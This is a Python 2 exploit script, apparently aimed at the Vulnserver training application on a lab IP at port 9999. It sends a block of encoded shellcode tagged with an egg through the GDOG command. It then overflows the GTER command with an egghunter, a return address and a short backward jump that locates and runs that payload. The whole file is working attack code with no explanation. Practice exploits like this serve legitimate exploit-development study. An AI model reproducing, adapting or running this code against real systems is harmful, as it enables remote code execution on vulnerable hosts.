#!/usr/bin/python

import socket
import os
import sys

buf =  ""
buf += "\xb8\xa7\x97\x07\x97\xdb\xdf\xd9\x74\x24\xf4\x5f\x2b"
buf += "\xc9\xb1\x52\x31\x47\x12\x83\xc7\x04\x03\xe0\x99\xe5"
buf += "\x62\x12\x4d\x6b\x8c\xea\x8e\x0c\x04\x0f\xbf\x0c\x72"
buf += "\x44\x90\xbc\xf0\x08\x1d\x36\x54\xb8\x96\x3a\x71\xcf"
buf += "\x1f\xf0\xa7\xfe\xa0\xa9\x94\x61\x23\xb0\xc8\x41\x1a"
buf += "\x7b\x1d\x80\x5b\x66\xec\xd0\x34\xec\x43\xc4\x31\xb8"
buf += "\x5f\x6f\x09\x2c\xd8\x8c\xda\x4f\xc9\x03\x50\x16\xc9"
buf += "\xa2\xb5\x22\x40\xbc\xda\x0f\x1a\x37\x28\xfb\x9d\x91"
buf += "\x60\x04\x31\xdc\x4c\xf7\x4b\x19\x6a\xe8\x39\x53\x88"
buf += "\x95\x39\xa0\xf2\x41\xcf\x32\x54\x01\x77\x9e\x64\xc6"
buf += "\xee\x55\x6a\xa3\x65\x31\x6f\x32\xa9\x4a\x8b\xbf\x4c"
buf += "\x9c\x1d\xfb\x6a\x38\x45\x5f\x12\x19\x23\x0e\x2b\x79"
buf += "\x8c\xef\x89\xf2\x21\xfb\xa3\x59\x2e\xc8\x89\x61\xae"
buf += "\x46\x99\x12\x9c\xc9\x31\xbc\xac\x82\x9f\x3b\xd2\xb8"
buf += "\x58\xd3\x2d\x43\x99\xfa\xe9\x17\xc9\x94\xd8\x17\x82"
buf += "\x64\xe4\xcd\x05\x34\x4a\xbe\xe5\xe4\x2a\x6e\x8e\xee"
buf += "\xa4\x51\xae\x11\x6f\xfa\x45\xe8\xf8\xc5\x32\x2c\x7d"
buf += "\xad\x40\xd0\x6f\x72\xcc\x36\xe5\x9a\x98\xe1\x92\x03"
buf += "\x81\x79\x02\xcb\x1f\x04\x04\x47\xac\xf9\xcb\xa0\xd9"
buf += "\xe9\xbc\x40\x94\x53\x6a\x5e\x02\xfb\xf0\xcd\xc9\xfb"
buf += "\x7f\xee\x45\xac\x28\xc0\x9f\x38\xc5\x7b\x36\x5e\x14"
buf += "\x1d\x71\xda\xc3\xde\x7c\xe3\x86\x5b\x5b\xf3\x5e\x63"
buf += "\xe7\xa7\x0e\x32\xb1\x11\xe9\xec\x73\xcb\xa3\x43\xda"
buf += "\x9b\x32\xa8\xdd\xdd\x3a\xe5\xab\x01\x8a\x50\xea\x3e"
buf += "\x23\x35\xfa\x47\x59\xa5\x05\x92\xd9\xd5\x4f\xbe\x48"
buf += "\x7e\x16\x2b\xc9\xe3\xa9\x86\x0e\x1a\x2a\x22\xef\xd9"
buf += "\x32\x47\xea\xa6\xf4\xb4\x86\xb7\x90\xba\x35\xb7\xb0"

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

buffer = "A" * 31 + egghunter + "B" * (151 - 31 - len(egghunter)) + "\x03\x12\x50\x62" + "\xeb\x82" + "C" * (175 - 150 - 4) + "D" * (3000 - 175)

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.222.129", 9999))
print expl.recv(1024)
expl.send("GDOG T00WT00W" + buf + "\r\n")
print expl.recv(1024)
expl.send('EXIT\r\n')
expl.close()

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.222.129", 9999))
print expl.recv(1024)
expl.send("GTER " + buffer + "\r\n")
print expl.recv(1024)
expl.send('EXIT\r\n')
expl.close()

print buffer
